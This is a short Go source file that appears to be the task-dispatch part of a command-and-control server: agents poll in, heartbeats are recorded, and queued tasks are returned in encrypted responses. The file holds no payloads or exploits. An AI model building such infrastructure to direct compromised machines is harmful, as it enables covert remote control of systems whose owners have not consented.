package main

import (
	"encoding/json"
	"log"
	"net/http"
	"sync"
)

var taskQueues = make(map[string][]Task)
var taskMu sync.Mutex

func queueTask(agentID string, task Task) {
	taskMu.Lock()
	defer taskMu.Unlock()
	taskQueues[agentID] = append(taskQueues[agentID], task)
	dbQueueTask(agentID, task)
}

func popTask(agentID string) *Task {
	return dbPopTask(agentID)
}

func handleTaskPoll(w http.ResponseWriter, r *http.Request, agentID string) {
	heartbeatAgent(agentID)

	task := popTask(agentID)
	if task == nil {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	taskJSON, err := json.Marshal(task)
	if err != nil {
		log.Printf("[c2] marshal error for agent %s: %v", agentID, err)
		w.WriteHeader(http.StatusNoContent)
		return
	}

	log.Printf("[c2] sending task %s to agent %s", task.Type, agentID)
	writeEncryptedResponse(w, agentID, taskJSON)
}
